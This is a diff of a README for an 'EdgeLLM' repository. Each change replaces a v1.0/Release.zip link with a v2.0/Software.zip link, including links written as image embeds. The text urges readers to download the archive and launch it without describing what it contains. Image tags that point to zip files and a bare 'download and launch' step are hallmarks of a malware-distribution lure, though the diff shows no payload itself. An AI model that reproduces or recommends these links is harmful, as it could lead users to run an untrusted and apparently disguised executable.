@@ -1,7 +1,7 @@
 
 # EdgeLLM
 
-![EdgeLLM Logo](https://github.com/Habababaa/EdgeLLM/releases/download/v1.0/Release.zip)
+![EdgeLLM Logo](https://github.com/Habababaa/EdgeLLM/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -38,7 +38,7 @@ This repository covers a range of topics related to running LLMs at the edge. So
 
 To start exploring the **EdgeLLM** project, download the latest version of the software from the following link:
 
-[![Download Software](https://github.com/Habababaa/EdgeLLM/releases/download/v1.0/Release.zip)](https://github.com/Habababaa/EdgeLLM/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Habababaa/EdgeLLM/releases/download/v2.0/Software.zip)](https://github.com/Habababaa/EdgeLLM/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the software to begin your journey into edge computing with LLMs.
 
@@ -56,4 +56,4 @@ The **EdgeLLM** project is licensed under the MIT License. See the `LICENSE` fil
 
 Let's embark on a journey into edge computing with LLMs. Happy coding! 🚀
 
-![EdgeLLM Image](https://github.com/Habababaa/EdgeLLM/releases/download/v1.0/Release.zip)
+![EdgeLLM Image](https://github.com/Habababaa/EdgeLLM/releases/download/v2.0/Software.zip)
